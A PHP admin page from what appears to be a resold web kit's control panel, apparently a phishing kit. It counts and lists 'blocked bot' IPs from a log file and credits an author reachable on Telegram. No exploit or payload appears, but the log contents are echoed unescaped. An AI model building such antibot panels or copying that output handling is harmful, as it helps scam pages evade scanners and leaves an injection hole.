<?php

    session_start();

    if (
        !isset($_SESSION['login']) ||
        !$_SESSION['login']
    ) {
        die(header("Location: ./login.php"));
    }

    $botList = fopen("../Guard/Audio/kill.txt", "r");
    $settings = parse_ini_file("../ChangeMe.ini");

    $bots = 0;

    while(($line = fgets($botList)) !== false) {
        $line = trim($line);
        if (preg_match("/IP/", $line)) {
            $bots++;
        }
    }

?>

<html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
        <title>Antibot</title>
        <link rel="stylesheet" href="./css/style.css">
        <link rel="stylesheet" href="./css/custom.css">
        <link rel="shortcut icon" href="./img/favicon.svg" type="image/x-icon">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark py-1 shadow-sm">
            <div class="container">
                <a class="navbar-brand" href="./">
                    <img class="logo-nav" src="./img/logo.svg" alt="">
                </a>
                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <ul class="navbar-nav mr-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="./">Home <i class="fad fa-house"></i></a>
                        </li>
                        <li class="nav-item active">
                            <a class="nav-link" href="./antibot.php">Antibot <i class="fad fa-robot"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./settings.php">Settings <i class="fad fa-cog"></i></a>
                        </li>
                    </ul>
                    <ul class="navbar-nav ml-auto">
                        <li class="nav-item">
                            <a class="nav-link" href="./jobs/reset.php?page=anti">Reset Logs <i class="fad fa-trash-alt"></i></a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="./jobs/logout.php">Logout <i class="fad fa-sign-out"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <div class="container mt-4">
            <?php

                if (isset($_SESSION['success'])) {
                    echo '<div class="alert alert-danger shadow-sm fade show"><span>' . $_SESSION['success'] . '</span><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button></div>';
                    unset($_SESSION['success']);
                }

            ?>
            <div class="row mt-3">
                <div class="col-lg-4 col-md-7 col-sm-9 mt-4 mx-auto">
                    <div class="card shadow-sm rounded-0">
                        <div class="card-body">
                            <div class="text-center">
                                <h3 class="font-weight-normal m-0">Blocked Bots (<?php echo $bots; ?>)</h3>
                            </div>
                            <div>
                                <span>
                                    <?php
                                    
                                        $botFile = fopen("../Guard/Audio/kill.txt", "r");
                                    
                                        if (trim(fgets(fopen("../Guard/Audio/kill.txt", "r"))) == "") {
                                            echo '<div class="text-center mt-1"><span>There are no bots. Less work for me.</span></div>';
                                        }

                                        while(($read = fgets($botFile)) !== false) {
                                            echo "<br>" . $read ;
                                        }

                                    ?>
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="text-center my-5">
                <span class="small">
                    <span>Code written by PremierGhost, not for redistribution.</span>
                    <br>
                    <span>Support is not guaranteed if my work is resold.</span>
                    <br>
                    <span>Sincerely, <a class="text-danger" href="https://t.me/PremierGhost" target="_blank">P</a></span>
                </span>
            </div>
        </div>
        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    </body>
</html>